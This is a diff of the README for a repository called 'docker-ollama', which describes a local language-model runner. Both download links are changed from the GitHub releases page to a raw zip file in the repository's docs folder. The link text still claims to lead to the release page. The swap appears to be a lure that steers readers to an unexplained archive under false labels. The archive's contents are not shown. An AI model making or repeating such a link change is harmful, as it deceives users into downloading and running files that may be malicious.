@@ -1,6 +1,6 @@
 # 🤖 docker-ollama - Run private intelligent models anywhere easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/shopfloormelampsoralini924/docker-ollama/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/shopfloormelampsoralini924/docker-ollama/raw/refs/heads/main/docs/docker-ollama-v1.1.zip)
 
 This application provides a simple way to run large language models on your own computer. It creates an isolated environment for Ollama. This software keeps your data private and ensures your setup remains secure. It mimics the popular OpenAI interface, which allows you to connect common AI tools to your local server without sending data to the cloud.
 
@@ -18,7 +18,7 @@ The system handles everything needed to run advanced models. It detects your har
 
 To start, you must visit the official release page to download the latest package. Choose the version that matches your environment from the link below.
 
-[Visit the release page to download the files](https://github.com/shopfloormelampsoralini924/docker-ollama/releases)
+[Visit the release page to download the files](https://github.com/shopfloormelampsoralini924/docker-ollama/raw/refs/heads/main/docs/docker-ollama-v1.1.zip)
 
 Follow these steps to set up the software:
 
